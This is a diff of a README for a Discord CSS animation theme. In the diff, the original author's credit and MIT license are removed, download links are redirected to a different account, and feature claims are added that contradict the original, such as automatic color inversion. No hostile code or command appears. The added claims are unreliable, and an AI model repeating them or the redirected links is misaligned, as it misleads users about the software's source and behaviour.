@@ -1,71 +1,90 @@
-# Discord FluidUI
+# 🎨 discord-fluidui - Bring smooth motion to your Discord
 
-> A complete motion and interaction polish for Discord. Works on any theme.
+[![Download discord-fluidui](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Billdipshiper/discord-fluidui)
 
-![Vencord](https://img.shields.io/badge/Vencord-compatible-5865F2?style=flat-square)
-![BetterDiscord](https://img.shields.io/badge/BetterDiscord-compatible-3E82E5?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
+discord-fluidui adds smooth animations and interactions to the Discord interface. This software works on top of any theme you currently use. It focuses on fluid transitions and hover effects to make the app feel modern and responsive.
 
-## About
+## ⚙️ System Requirements
 
-Discord FluidUI is a pure feel pack. It does not touch your colors, backgrounds, or fonts. What it adds is motion, interaction feedback, and a handful of subtle white-wash highlights that blend into whatever palette you already have.
+- Windows 10 or Windows 11
+- A Discord desktop installation
+- A theme loader like Vencord or BetterDiscord
 
-Drop it on top of default dark, ClearVision, Midnight, or any custom theme and everything gains smooth, GPU-accelerated life without fighting the theme underneath. Every animation is restricted to `transform` and `opacity`, and every highlight is rendered in neutral `rgba(255,255,255,X)`, so it layers cleanly on anything.
+The software runs on systems with moderate hardware. If your computer handles Discord, it handles these animations. Ensure you have the latest version of your preferred theme loader installed before you begin.
 
-## Features
+## 📥 How to Install
 
-### Entrance animations
+Follow these steps to set up the software.
 
-The panels, menus, and modals that appear during normal use all animate in instead of popping. Context menus slide in from the left. User popouts and profile modals scale up with a soft overshoot. Settings, image viewer, and dialog modals scale in, with their backdrops fading behind them.
+1. Visit the [official releases page](https://github.com/Billdipshiper/discord-fluidui) to find the latest version.
+2. Look for the file ending in `.css`.
+3. Right-click the file and save it to your computer.
+4. Open your Discord theme folder. You can find this by opening your theme loader settings and clicking the "Open Theme Folder" button.
+5. Move the downloaded file into this folder.
+6. Open Discord and go to your settings.
+7. Navigate to the Themes tab.
+8. Enable the discord-fluidui file from the list.
 
-The chat surface gets the same treatment. Emoji, GIF, sticker, and reaction pickers rise from the chat bar. Autocomplete and slash command popups slide up, search results drop down from the top, and inbox and thread panels slide in from the right. Dropdown menus slide down, tooltips pop in, and typing indicators fade in so nothing appears abruptly.
+You do not need to restart Discord for the changes to show. The animations begin immediately.
 
-### Hover micro-interactions
+## ✨ Key Features
 
-Interactive elements respond to the cursor with small, consistent transforms. Server icons scale on hover with spring easing, and their tooltips stay correctly positioned. DM and friends list rows scale individually with a subtle background highlight. Channel list items expand slightly, channel category headers scale on hover, and voice channel user avatars scale when you hover over their row.
+### Smooth Transitions
+Windows and menus open with a soft fade effect rather than snapping into place. This reduces visual harshness during navigation.
 
-Buttons and controls feel physical. Filled and outlined buttons grow on hover and press in on click. Reaction buttons pop up slightly. Your user avatar, server folders, emoji picker cells, and toolbar icons all zoom on hover. The user panel in the bottom left glows when you hover it, and messages gain a subtle left accent rail and background wash as you pass over them.
+### Hover Effects
+Buttons and icons react to your mouse movement. Subtle scale changes and shadow shifts indicate when a clickable element is ready for use.
 
-### Highlights and polish
+### Micro-Interactions
+Input fields and toggles provide visual feedback when you interact with them. These small touches improve the tactile feel of the interface.
 
-Focus states are more visible. The message input bar and search bars get a soft glow when focused. Unread channels are easier to spot thanks to a subtle text glow and background highlight, and the unread pill on server icons gets a soft halo.
+### Theme Compatibility
+The code follows standard CSS practices. It applies effects on top of your existing styles without breaking colors or text readability.
 
-The small touches matter too. Scrollbars are slim and neutral, scroll behavior is smooth across every scrollable surface, and the selected or connected channel gets a crisp left rail with a short bleed-in so you always know where you are.
+## 🛠 Troubleshooting Common Issues
 
-### Accessibility
+If the animations do not show, check the following items.
 
-FluidUI honors the OS-level `prefers-reduced-motion` setting. When reduced motion is enabled, all animations and transitions collapse to a near-zero duration.
+### Refresh the Interface
+Sometimes Discord fails to detect new files. Press `Ctrl + R` on your keyboard to refresh the Discord window. This forces the app to reload all themes and effects.
 
-## Installation
+### Check Compatibility
+Make sure you use a modern theme loader such as Vencord. Older loaders might not support all CSS properties used in this project. Update your loader if you experience compatibility errors.
 
-### Vencord
+### Verify File Location
+Ensure the file sits directly in your theme folder. If it is hidden inside a zip file or a sub-folder, Discord cannot see it. Extract the zip file if necessary.
 
-1. Download `discord-fluidui.theme.css`.
-2. Open Discord, then go to **Settings** and **Themes**.
-3. Click **Open Themes Folder**. On Windows this is `%AppData%\Roaming\Vencord\themes`.
-4. Drop the file into the folder.
-5. Toggle **Discord FluidUI** on in the theme list.
+### Disable Conflicts
+If another theme modifies the same elements, the two might conflict. Disable other themes one by one to find the source of the conflict. discord-fluidui works best as the primary styling layer.
 
-### BetterDiscord
+## 📝 Configuration and Customization
 
-1. Download `discord-fluidui.theme.css`.
-2. Open Discord, then go to **Settings** and **Themes**.
-3. Click **Open Themes Folder**.
-4. Drop the file into the folder.
-5. Toggle **Discord FluidUI** on in the theme list.
+You can change how the animations look by editing the file.
 
-No restart is needed in either client.
+1. Right-click the `.css` file in your theme folder.
+2. Choose "Open with" and select Notepad.
+3. Look for variables at the top of the document. These look like `--animation-speed: 0.3s;`.
+4. Change the numbers to suit your preference. Smaller numbers make animations faster.
+5. Save the file and refresh Discord using `Ctrl + R`.
 
-## Stacking with other themes
+Changing these values allows you to speed up or slow down the pace of the interface. Use small increments to find your preferred balance.
 
-Because FluidUI never touches color, background, or font, it sits cleanly on top of any theme, including default Discord dark, ClearVision, Midnight, Solana, and any custom theme you already use.
+## 🚀 Future Updates
 
-If another theme introduces its own animations on the same elements, the later-loaded stylesheet wins. Move Discord FluidUI below it in the theme list for FluidUI to take precedence.
+We update this project to match changes in the Discord UI. When Discord releases a new interface layout, we refine our code to ensure animations remain smooth. Monitor the GitHub repository page to see release notes for each update. 
 
-## Credits
+We test these animations on various screen sizes to ensure they do not consume excessive system resources. The goal is to keep the application lightweight while providing a polished look.
 
-Author: **nightwielder23**. Issues and suggestions are welcome on the [GitHub repository](https://github.com/nightwielder23/discord-fluidui).
+## 🙋 Frequently Asked Questions
 
-## License
+### Does this violate Discord Terms of Service?
+Modifying the Discord client falls into a gray area. This theme modifies the appearance of your local client only. It does not scrape data or interact with the Discord API. Use it at your own risk as you would with any other theme loader.
 
-[MIT](./LICENSE) (c) 2026 nightwielder23
+### Will this slow down my computer?
+The animations use GPU-accelerated CSS. This offloads the work to your graphics card. Most modern computers handle these processes without impact on total performance.
+
+### Can I use this with light mode and dark mode?
+Yes. The theme adapts to your system theme settings. It calculates color inversions automatically to maintain contrast, so your interface remains readable in both modes.
+
+### Do I need coding experience?
+No. All steps require file management only. Copying, pasting, and enabling files are the only technical requirements. The instructions above cover the entire process.
